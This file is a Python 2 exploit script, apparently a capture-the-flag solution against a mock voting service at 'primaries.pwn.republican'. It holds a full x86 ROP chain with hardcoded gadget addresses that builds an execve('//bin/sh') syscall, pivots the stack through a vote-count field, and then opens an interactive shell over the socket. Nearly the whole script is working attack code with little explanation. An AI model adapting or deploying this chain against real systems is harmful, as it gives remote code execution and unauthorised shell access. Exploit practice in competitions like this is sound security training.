import struct
import socket
import telnetlib
import time
import os
import sys

def recvUntil(so,n):
    d = ''
    while 1:
        c = so.recv(1)
        if c=='': raise Exception('Disconnected: '+repr(d))
        else: d+=c
        if n in d:
            return d

so = socket.socket()
if len(sys.argv)==1:
    so.connect(('',9000))
    os.system('ps aux | grep lol')
    raw_input('[]')
else:
    so.connect(('primaries.pwn.republican',1901))

# Send a vote
def vote(so, pl):
    print recvUntil(so,':\n')
    so.send('test\n')

    print recvUntil(so,':\n')
    so.send('1\n')

    print recvUntil(so,':\n')
    so.send('test2\n')

    print recvUntil(so,'-in\n')
    so.send('4\n')

    print recvUntil(so,'?\n')
    so.send(pl+'\n')

pl='BBBB'


#-----BEGIN SHITTY ROP CHAIN-----

# Get stack pointer to write null later and store it in ebp
pl+= struct.pack('<I',0x0806f521) # pop ecx ; pop ebx ; ret
pl+= struct.pack('<I',0x0806d045) # add esp, 4 ; pop ebx ; pop esi ; ret
pl+='CCCC'
pl+= struct.pack('<I',0x080bb5f5) # push esp ; and al, 0xc ; call ecx
pl+= 'DDDD'
pl+= struct.pack('<I',0x08050012) # mov eax, ebx ; pop ebx ; ret
pl+= 'EEEE'
pl+= struct.pack('<I',0x080583a8) # xchg eax, ebp ; ret

# Get a stack pointer to //bin/sh into ebx
pl+= struct.pack('<I',0x0806f521) # pop ecx ; pop ebx ; ret
pl+= struct.pack('<I',0x080a5bfa/2) # ecx <- pop eax ; pop ebx ; pop esi ; pop edi ; ret
pl+= 'FFFF'
pl+= struct.pack('<I',0x08048ddc) # add ecx, ecx ; ret

pl+= struct.pack('<I',0x080bb5f5) # push esp ; and al, 0xc ; call ecx
# ebx <- esp
pl+= '//bin/sh'

# Add to stored stack pointer and store the null
pl+= struct.pack('<I',0x080583a8) # xchg eax, ebp ; ret
pl+= (struct.pack('<I',0x08096717)+"GGGG")*3 # add eax, 0xc ; pop edi ; ret
pl+= (struct.pack('<I',0x08096703)+"GGGG") # add eax, 8 ; pop edi ; ret
pl+= struct.pack('<I',0x0807bfd1) # mov dword ptr [eax], edx ; ret




# Null out ecx
pl+= struct.pack('<I',0x08054f20) # xor eax, eax ; ret
pl+= struct.pack('<I',0x0804a1f5) # pop esi ; ret
pl+= struct.pack('<I',0x8048008) # -> 0
pl+= struct.pack('<I',0x080e6aad) # xchg eax, ecx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret

# Set eax to 0xb
pl+= struct.pack('<I',0x08054f20) # xor eax, eax ; ret
pl+= struct.pack('<I',0x08096372) # add eax, 0xb ; pop edi ; ret
pl+= 'HHHH'

# Do out syscall
pl+= struct.pack('<I',0x08049b81) # : int 0x80

# Fill up our heap buffer
pl = pl.ljust(0x100,'A')

# This is to pivot down the stack some to our delegate count
pl+= struct.pack('<I',0x0805a8a3) # : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

# Delegate count acts as pivot to rop chain
pl+=struct.pack('<I',0x0809f6f4*10-1) # : pop ebp ; cld ; leave ; ret

#-----BEGIN SHITTY ROP CHAIN-----

vote(so, pl)

for i in range(99):
    # Trump 2016
    vote(so,'trump%u'%i)

t = telnetlib.Telnet()
t.sock = so
t.interact()

